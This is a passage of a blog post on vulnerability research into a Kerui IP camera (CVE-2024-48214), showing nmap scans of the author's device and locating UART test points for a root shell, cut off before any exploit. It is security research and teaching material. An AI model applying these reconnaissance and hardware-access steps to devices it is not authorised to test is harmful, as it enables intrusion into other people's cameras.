tabindex="0" class="ay be bf bg z bh bi bj bk bl" placeholder="Search" value=""/></div></div></div><div class="h k w fg fh"><div class="fi ab"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerWriteButton" rel="noopener follow" href="/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav-----------"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Write"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg><div class="dt l">Write</div></div></a></span></div></div><div class="k j i d"><div class="fi ab"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSearchButton" rel="noopener follow" href="/search?source=---top_nav_layout_nav----------------------------------"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Search"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div></a></div></div><div class="fi h k j"><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" rel="noopener follow" href="/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2F%40shenhavmor%2Fexploiting-a-chinese-camera-for-fun-cve-2024-48214-2d56848870c2&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------">Sign in</a></span></p></div></div></div><div class="l" aria-hidden="false"><button class="ay fn am ab q ao fo fp fq" aria-label="user options menu" data-testid="headerUserIcon"><div class="l fj"><img alt="" class="l fd by bz ca cx" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png" width="32" height="32" loading="lazy" role="presentation"/><div class="fr by l bz ca fs n ay ft"></div></div></button></div></div></div><div class="l"><div class="fu fv fw fx fy l"><div class="ab cb"><div class="ci bh fz ga gb gc"></div></div><article><div class="l"><div class="l"><span class="l"></span><section><div><div class="fs gi gj gk gl gm"></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><div><h1 id="9129" class="pw-post-title gs gt gu bf gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu bk" data-testid="storyTitle">Exploiting a Chinese camera for fun CVE-2024–48214</h1><div><div class="speechify-ignore ab cp"><div class="speechify-ignore bh l"><div class="hv hw hx hy hz ab"><div><div class="ab ia"><div><div class="bm" aria-hidden="false"><a rel="noopener follow" href="/@shenhavmor?source=post_page---byline--2d56848870c2--------------------------------"><div class="l ib ic by id ie"><div class="l fj"><img alt="Shenhav Mor" class="l fd by dd de cx" src="https://miro.medium.com/v2/resize:fill:88:88/1*mkR0enbxPtj253Og74Bbig.jpeg" width="44" height="44" loading="lazy" data-testid="authorPhoto"/><div class="if by l dd de fs n ig ft"></div></div></div></a></div></div></div></div><div class="bn bh l"><div class="ab"><div style="flex:1"><span class="bf b bg z bk"><div class="ih ab q"><div class="ab q ii"><div class="ab q"><div><div class="bm" aria-hidden="false"><p class="bf b ij ik bk"><a class="af ag ah ai aj ak al am an ao ap aq ar il" data-testid="authorName" rel="noopener follow" href="/@shenhavmor?source=post_page---byline--2d56848870c2--------------------------------">Shenhav Mor</a></p></div></div></div><span class="im in" aria-hidden="true"><span class="bf b bg z du">·</span></span><p class="bf b ij ik du"><span><a class="io ip ah ai aj ak al am an ao ap aq ar ex iq ir" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Ff1f06bd2dad8&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40shenhavmor%2Fexploiting-a-chinese-camera-for-fun-cve-2024-48214-2d56848870c2&amp;user=Shenhav+Mor&amp;userId=f1f06bd2dad8&amp;source=post_page-f1f06bd2dad8--byline--2d56848870c2---------------------post_header-----------">Follow</a></span></p></div></div></span></div></div><div class="l is"><span class="bf b bg z du"><div class="ab cn it iu iv"><span class="bf b bg z du"><div class="ab ae"><span data-testid="storyReadTime">9 min read</span><div class="iw ix l" aria-hidden="true"><span class="l" aria-hidden="true"><span class="bf b bg z du">·</span></span></div><span data-testid="storyPublishDate">Oct 27, 2024</span></div></span></div></span></div></div></div><div class="ab cp iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn"><div class="h k w fg fh q"><div class="kd l"><div class="ab q ke kf"><div class="pw-multi-vote-icon fj kg kh ki kj"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerClapButton" rel="noopener follow" href="/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F2d56848870c2&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40shenhavmor%2Fexploiting-a-chinese-camera-for-fun-cve-2024-48214-2d56848870c2&amp;user=Shenhav+Mor&amp;userId=f1f06bd2dad8&amp;source=---header_actions--2d56848870c2---------------------clap_footer-----------"><div><div class="bm" aria-hidden="false"><div class="kk ao kl km kn ko am kp kq kr kj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ks kt ku kv kw kx ky"><p class="bf b dv z du"><span class="kz">--</span></p></div></div></div><div><div class="bm" aria-hidden="false"><button class="ao kk la lb ab q fk lc ld" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="le"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div><div class="ab q jo jp jq jr js jt ju jv jw jx jy jz ka kb kc"><div class="lf k j i d"></div><div class="h k"></div><div class="fd lg cn"><div class="l ae"><div class="ab cb"><div class="lh li lj lk ll lm ci bh"><div class="ab"><div class="bm bh" aria-hidden="false"><div><div class="bm" aria-hidden="false"><button aria-label="Listen" data-testid="audioPlayButton" class="af fk ah ai aj ak al ln an ao ap ex lo lp ld lq lr ls lt lu s lv lw lx ly lz ma mb u mc md me"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Listen</p></div></button></div></div></div></div></div></div></div></div><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="af fk ah ai aj ak al ln an ao ap ex lo lp ld lq lr ls lt lu s lv lw lx ly lz ma mb u mc md me"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Share</p></div></button></div></div></div></div></div></div></div></div></div><p id="00c7" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">Kerui IP camera QR Code scan to RCE</p><p id="d10c" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk"><strong class="mh gv">Introduction</strong></p><p id="4fc8" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">CVE-2024–48214 is a QR code scan to RCE on <a class="af nd" href="https://www.keruistore.com/kerui-hd-3mp-1080p-tuya-app-ip-camera.html" rel="noopener ugc nofollow" target="_blank">KERUI IP Camera</a></p><p id="8d69" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">This article primarily discusses the key aspects of the CVE, The research journey was both fun and led to various other directions. My goal is to provide a comprehensive overview of the IoT research process while keeping it concise. Digging into every detail would turn this into a book — and that’s not our purpose here.</p><p id="c54e" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk"><strong class="mh gv">So how did I start my research journey?</strong></p><p id="3e10" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">Bought a camera from Aliexpress and wanted it to be cheap (since I buy the products I research), found something that looked legit (hundreds of thousands of sales, etc), and also had many features. So I bought 2 of these. It has arrived, and now we have a box, and our game begins.</p><p id="f2b7" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk"><strong class="mh gv">Nmap</strong></p><p id="7b0b" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">First we would like to check if there are any open ports to the camera, maybe we have TELNET or anything we can quick check.</p><p id="1378" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">we tried a few simple classic scans:</p><pre class="ne nf ng nh ni nj nk nl bp nm bb bk"><span id="c3bd" class="nn no gu nk b bg np nq l nr ns">sudo nmap -sC -sV -oN normal.txt 192.168.1.178</span></pre><figure class="ne nf ng nh ni nw nt nu paragraph-image"><div role="button" tabindex="0" class="nx ny fj nz bh oa"><div class="nt nu nv"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ku2pqwf0XArLawF0NUhCWg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ku2pqwf0XArLawF0NUhCWg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ku2pqwf0XArLawF0NUhCWg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*ku2pqwf0XArLawF0NUhCWg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*ku2pqwf0XArLawF0NUhCWg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ku2pqwf0XArLawF0NUhCWg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ku2pqwf0XArLawF0NUhCWg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*ku2pqwf0XArLawF0NUhCWg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ku2pqwf0XArLawF0NUhCWg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ku2pqwf0XArLawF0NUhCWg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ku2pqwf0XArLawF0NUhCWg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ku2pqwf0XArLawF0NUhCWg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ku2pqwf0XArLawF0NUhCWg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*ku2pqwf0XArLawF0NUhCWg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lm ob c" width="700" height="151" loading="lazy" role="presentation"/></picture></div></div><figcaption class="oc ff od nt nu oe of bf b bg z du">Output for the normal scan</figcaption></figure><pre class="ne nf ng nh ni nj nk nl bp nm bb bk"><span id="b61c" class="nn no gu nk b bg np nq l nr ns">sudo nmap -p- -oN all_ports.txt 192.168.1.178</span></pre><figure class="ne nf ng nh ni nw nt nu paragraph-image"><div class="nt nu og"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*O_fjU53wZnhL_fBSZFJ8-A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*O_fjU53wZnhL_fBSZFJ8-A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*O_fjU53wZnhL_fBSZFJ8-A.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*O_fjU53wZnhL_fBSZFJ8-A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*O_fjU53wZnhL_fBSZFJ8-A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*O_fjU53wZnhL_fBSZFJ8-A.png 1100w, https://miro.medium.com/v2/resize:fit:1110/format:webp/1*O_fjU53wZnhL_fBSZFJ8-A.png 1110w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 555px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*O_fjU53wZnhL_fBSZFJ8-A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*O_fjU53wZnhL_fBSZFJ8-A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*O_fjU53wZnhL_fBSZFJ8-A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*O_fjU53wZnhL_fBSZFJ8-A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*O_fjU53wZnhL_fBSZFJ8-A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*O_fjU53wZnhL_fBSZFJ8-A.png 1100w, https://miro.medium.com/v2/resize:fit:1110/1*O_fjU53wZnhL_fBSZFJ8-A.png 1110w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 555px"/><img alt="" class="bh lm ob c" width="555" height="149" loading="lazy" role="presentation"/></picture></div><figcaption class="oc ff od nt nu oe of bf b bg z du">Output for full TCP scan</figcaption></figure><pre class="ne nf ng nh ni nj nk nl bp nm bb bk"><span id="c9b0" class="nn no gu nk b bg np nq l nr ns">sudo nmap -sU 192.168.1.178</span></pre><figure class="ne nf ng nh ni nw nt nu paragraph-image"><div class="nt nu oh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*r-Ca8lIWdlgW0_6NHAxOvQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*r-Ca8lIWdlgW0_6NHAxOvQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*r-Ca8lIWdlgW0_6NHAxOvQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*r-Ca8lIWdlgW0_6NHAxOvQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*r-Ca8lIWdlgW0_6NHAxOvQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*r-Ca8lIWdlgW0_6NHAxOvQ.png 1100w, https://miro.medium.com/v2/resize:fit:1126/format:webp/1*r-Ca8lIWdlgW0_6NHAxOvQ.png 1126w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 563px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*r-Ca8lIWdlgW0_6NHAxOvQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*r-Ca8lIWdlgW0_6NHAxOvQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*r-Ca8lIWdlgW0_6NHAxOvQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*r-Ca8lIWdlgW0_6NHAxOvQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*r-Ca8lIWdlgW0_6NHAxOvQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*r-Ca8lIWdlgW0_6NHAxOvQ.png 1100w, https://miro.medium.com/v2/resize:fit:1126/1*r-Ca8lIWdlgW0_6NHAxOvQ.png 1126w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 563px"/><img alt="" class="bh lm ob c" width="563" height="109" loading="lazy" role="presentation"/></picture></div><figcaption class="oc ff od nt nu oe of bf b bg z du">Output for UDP scan</figcaption></figure><p id="b103" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">The only port we see that may be interesting is 6668 (TUYA custom protocol) which is interesting but not for this article.<br/>So we have no choice but to try and find a UART port, since we would probably want to have a root shell so we can debug the system, view logs, and much more..</p><p id="6fc8" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk"><strong class="mh gv">UART identification:</strong></p><p id="d35d" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">We opened the camera until only the inner board and motors were left, and we tried to look at the board for any TX RX labels.<br/>As we all know UART — (Universal Asynchronous Receiver/Transmitter) is a hardware communication protocol that enables serial data exchange between devices. I won’t be explaining UART in this article but I will mention that it needs 3 wires: ground, TX, and RX, a ground point doesn’t matter to us since we can connect to any ground point on the board, we need to find the UART TX and UART RX.<br/>Unfortunately, they did a good job and didn’t leave any marks on the TX RX of the UART on the board, also they didn’t have the standard 4-pin row of a UART that lets attackers identify it in a second. kudos to them for that…<br/>Next what I would usually do is download the datasheet of the processor and see what pins of the processor the UART TX and RX should be in, but there isn’t a publicly available datasheet for that specific processor, I did find a datasheet for a <a class="af nd" href="https://monitor.espec.ws/files/700cafec77419c2d7705f376c974b8d0ff72_986.pdf" rel="noopener ugc nofollow" target="_blank">similar processor</a>, but it was a BGA packaging so it didn’t help me at all :/ Guess that we need to make some guesses to find the UART this time :( How?<br/>I will say that usually on IOT devices UART will be 3.3/5 volts, in the Kerui camera it was 3.3. logical 1 will be 3.3 volts and logical 0 will be 0. So when identifying a UART tx test point, when we restart the device it will usually send some data that the bootloader outputs (In our cast the Uboot Bootloader) we should see on idle 3.3 volts, and when the Uboot sends data we will see it float between 0–3.3.</p><p id="79c3" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">Unfortunately, I do not have a <a class="af nd" href="https://grandideastudio.com/portfolio/security/jtagulator/" rel="noopener ugc nofollow" target="_blank">JTAGULATOR </a>or other stuff that can help me bruteforce the test points quickly. So I did an old-school move, grabbed a multimeter, and tested each point. It didn’t take a lot until I found a point that behaves that way.</p><figure class="ne nf ng nh ni nw nt nu paragraph-image"><div role="button" tabindex="0" class="nx ny fj nz bh oa"><div class="nt nu oi"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*yxvfrZ0nLAK6GldYPq6cTg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*yxvfrZ0nLAK6GldYPq6cTg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*yxvfrZ0nLAK6GldYPq6cTg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*yxvfrZ0nLAK6GldYPq6cTg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*yxvfrZ0nLAK6GldYPq6cTg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*yxvfrZ0nLAK6GldYPq6cTg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yxvfrZ0nLAK6GldYPq6cTg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*yxvfrZ0nLAK6GldYPq6cTg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*yxvfrZ0nLAK6GldYPq6cTg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*yxvfrZ0nLAK6GldYPq6cTg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*yxvfrZ0nLAK6GldYPq6cTg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*yxvfrZ0nLAK6GldYPq6cTg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*yxvfrZ0nLAK6GldYPq6cTg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*yxvfrZ0nLAK6GldYPq6cTg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lm ob c" width="700" height="934" loading="lazy" role="presentation"/></picture></div></div><figcaption class="oc ff od nt nu oe of bf b bg z du">The TX and RX testpoints of the UART of the board</figcaption></figure><p id="a68b" class="pw-post-body-paragraph mf mg gu mh b mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc gn bk">Now we will need a <a class="af nd" 